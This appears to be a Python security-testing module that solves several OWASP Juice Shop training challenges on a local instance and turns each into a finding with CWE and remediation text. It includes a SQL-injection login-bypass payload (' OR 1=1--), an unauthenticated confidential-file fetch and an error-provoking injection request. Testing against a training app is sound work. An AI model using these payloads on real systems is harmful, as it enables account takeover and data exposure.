"""Client and challenge map for OWASP Juice Shop (the *security* target).

Juice Shop is a well-known, deliberately vulnerable web app. We attack a small, reliable
set of its training **challenges**, then confirm each one via its own API
(``GET /api/Challenges``, field ``solved``). A solved challenge is proof the vulnerability
is real, so we turn it into a :class:`~secureqa.findings.Finding`.
(TR: Juice Shop'un eğitim "challenge"larını çözüp /api/Challenges ile doğrularız;
çözülen her challenge bir güvenlik bulgusuna dönüşür.)

We only use documented, non-destructive training exploits against a *local* instance.
"""

from __future__ import annotations

import time
from dataclasses import dataclass

import requests

from secureqa.findings import Finding


@dataclass(frozen=True)
class ChallengeInfo:
    """How one Juice Shop challenge maps to an OWASP/CWE finding (TR: challenge -> bulgu)."""

    key: str                 # stable Juice Shop challenge key, e.g. "loginAdminChallenge"
    name: str                # human name shown on the score board
    title_tr: str
    title_en: str
    severity: str
    owasp: str
    cwe: str
    remediation_tr: str
    remediation_en: str

    def finding(self, base_url: str, evidence: str, test_id: str = "") -> Finding:
        """Build a :class:`Finding` for this solved challenge."""
        return Finding(
            id=f"JS-{self.key}",
            title_tr=self.title_tr,
            title_en=self.title_en,
            severity=self.severity,
            owasp=self.owasp,
            cwe=self.cwe,
            url=f"{base_url}/#/score-board",
            evidence=evidence,
            remediation_tr=self.remediation_tr,
            remediation_en=self.remediation_en,
            description_tr=f"Juice Shop challenge '{self.name}' çözüldü — zafiyet doğrulandı.",
            description_en=f"Juice Shop challenge '{self.name}' was solved — the vulnerability is confirmed.",
            test_id=test_id,
        )


# The challenges we attack. Keys come from Juice Shop's data/static/challenges.yml and are
# stable across versions. (TR: Saldırdığımız challenge'lar — anahtarlar sürümler arası sabit.)
CHALLENGES: dict[str, ChallengeInfo] = {
    "loginAdminChallenge": ChallengeInfo(
        key="loginAdminChallenge",
        name="Login Admin",
        title_tr="SQL Enjeksiyonu ile Yönetici Girişi (Juice Shop)",
        title_en="SQL Injection Admin Login (Juice Shop)",
        severity="critical",
        owasp="A03:2021-Injection",
        cwe="CWE-89",
        remediation_tr="Giriş sorgularını parametreli yapın; girdiyi asla SQL metnine birleştirmeyin.",
        remediation_en="Use parameterized login queries; never concatenate input into SQL text.",
    ),
    "localXssChallenge": ChallengeInfo(
        key="localXssChallenge",
        name="DOM XSS",
        title_tr="DOM Tabanlı XSS (Juice Shop arama)",
        title_en="DOM-based XSS (Juice Shop search)",
        severity="high",
        owasp="A03:2021-Injection",
        cwe="CWE-79",
        remediation_tr="Kullanıcı girdisini DOM'a yazarken güvenli API'ler (textContent) ve çıktı kodlaması kullanın.",
        remediation_en="Use safe DOM APIs (textContent) and output encoding when writing user input to the DOM.",
    ),
    "directoryListingChallenge": ChallengeInfo(
        key="directoryListingChallenge",
        name="Confidential Document",
        title_tr="Gizli Belgeye Erişim (Juice Shop /ftp)",
        title_en="Confidential Document Access (Juice Shop /ftp)",
        severity="high",
        owasp="A02:2021-Cryptographic Failures",
        cwe="CWE-200",
        remediation_tr="Gizli dosyaları web kökünün dışında tutun ve erişimi yetkiyle sınırlayın.",
        remediation_en="Keep confidential files outside the web root and restrict access with authorization.",
    ),
    "errorHandlingChallenge": ChallengeInfo(
        key="errorHandlingChallenge",
        name="Error Handling",
        title_tr="Ayrıntılı Hata Mesajı İfşası (Juice Shop)",
        title_en="Verbose Error Disclosure (Juice Shop)",
        severity="medium",
        owasp="A05:2021-Security Misconfiguration",
        cwe="CWE-209",
        remediation_tr="Kullanıcıya genel hata sayfası gösterin; ayrıntıları yalnızca sunucu loguna yazın.",
        remediation_en="Show a generic error page; write details only to the server log.",
    ),
    "exposedMetricsChallenge": ChallengeInfo(
        key="exposedMetricsChallenge",
        name="Exposed Metrics",
        title_tr="Açıkta Bırakılan Metrik Ucu (Juice Shop /metrics)",
        title_en="Exposed Metrics Endpoint (Juice Shop /metrics)",
        severity="low",
        owasp="A05:2021-Security Misconfiguration",
        cwe="CWE-200",
        remediation_tr="İzleme uçlarını (/metrics) kimlik doğrulama ile koruyun veya dışarıya kapatın.",
        remediation_en="Protect monitoring endpoints (/metrics) with authentication or do not expose them.",
    ),
    "adminSectionChallenge": ChallengeInfo(
        key="adminSectionChallenge",
        name="Admin Section",
        title_tr="Yönetici Bölümüne Erişim (Juice Shop)",
        title_en="Admin Section Access (Juice Shop)",
        severity="high",
        owasp="A01:2021-Broken Access Control",
        cwe="CWE-284",
        remediation_tr="Yönetici rotalarını sunucu tarafında rol kontrolüyle koruyun (sadece istemci gizleme yetmez).",
        remediation_en="Protect admin routes with server-side role checks (hiding them on the client is not enough).",
    ),
}


class JuiceShopClient:
    """A thin HTTP client for a local Juice Shop instance (TR: yerel Juice Shop istemcisi)."""

    def __init__(self, base_url: str, session: requests.Session | None = None) -> None:
        self.base_url = base_url.rstrip("/")
        self.session = session or requests.Session()

    # -------------------------------------------------- challenge status
    def challenges(self) -> list[dict]:
        """Return the list of challenges from ``GET /api/Challenges`` (``data`` field)."""
        response = self.session.get(self.base_url + "/api/Challenges", timeout=10)
        response.raise_for_status()
        return response.json().get("data", [])

    def challenge_by_key(self, key: str) -> dict | None:
        """Find one challenge dict by its stable key, or ``None``."""
        for challenge in self.challenges():
            if challenge.get("key") == key:
                return challenge
        return None

    def is_solved(self, key: str) -> bool:
        """True when the challenge with ``key`` is marked solved."""
        challenge = self.challenge_by_key(key)
        return bool(challenge and challenge.get("solved"))

    def wait_until_solved(self, key: str, timeout_s: float = 8.0) -> bool:
        """Poll ``/api/Challenges`` until the challenge is solved or the timeout passes.

        Juice Shop records a solve slightly asynchronously, so we give it a moment.
        (TR: Çözüm biraz gecikmeli kaydedilebilir; kısa süre bekleyip tekrar bakarız.)
        """
        deadline = time.monotonic() + timeout_s
        while time.monotonic() < deadline:
            if self.is_solved(key):
                return True
            time.sleep(0.5)
        return self.is_solved(key)

    def is_reachable(self) -> bool:
        """True when the instance answers (used to skip tests when it is not running)."""
        try:
            return self.session.get(self.base_url + "/rest/admin/application-version", timeout=4).ok
        except requests.RequestException:
            try:
                return self.session.get(self.base_url + "/", timeout=4).ok
            except requests.RequestException:
                return False

    # -------------------------------------------------- exploits (documented, non-destructive)
    def login_sqli(self, email_payload: str = "' OR 1=1--") -> tuple[bool, str]:
        """SQL-injection login bypass via ``POST /rest/user/login``.

        A successful bypass returns an ``authentication`` token in the JSON body.
        """
        response = self.session.post(
            self.base_url + "/rest/user/login",
            json={"email": email_payload, "password": "whatever"},
            timeout=10,
        )
        ok = response.status_code == 200 and "authentication" in response.text
        token = ""
        if ok:
            token = response.json().get("authentication", {}).get("token", "")[:24]
        evidence = f"POST /rest/user/login email={email_payload!r} -> HTTP {response.status_code}; " + (
            f"token received ({token}...)" if ok else "no token"
        )
        return ok, evidence

    def get_confidential_document(self) -> tuple[bool, str]:
        """Fetch the confidential document at ``/ftp/acquisitions.md`` (no auth)."""
        response = self.session.get(self.base_url + "/ftp/acquisitions.md", timeout=10)
        ok = response.status_code == 200 and "acquisition" in response.text.lower()
        evidence = f"GET /ftp/acquisitions.md -> HTTP {response.status_code}; {len(response.text)} bytes"
        return ok, evidence

    def get_metrics(self) -> tuple[bool, str]:
        """Fetch the Prometheus metrics endpoint at ``/metrics`` (should not be public)."""
        response = self.session.get(self.base_url + "/metrics", timeout=10)
        ok = response.status_code == 200 and "# HELP" in response.text
        evidence = f"GET /metrics -> HTTP {response.status_code}; starts: {response.text[:60]!r}"
        return ok, evidence

    def provoke_error(self) -> tuple[bool, str]:
        """Trigger an un-gracefully handled error by sending a wrong type to login.

        Sending ``email`` as an array makes the ORM throw, leaking an error body.
        """
        response = self.session.post(
            self.base_url + "/rest/user/login",
            json={"email": {"$ne": None}, "password": {"$ne": None}},
            timeout=10,
        )
        text = response.text.lower()
        ok = response.status_code >= 400 and ("error" in text or "sequelize" in text or "sql" in text)
        evidence = f"POST /rest/user/login with typed payload -> HTTP {response.status_code}; starts: {response.text[:80]!r}"
        return ok, evidence
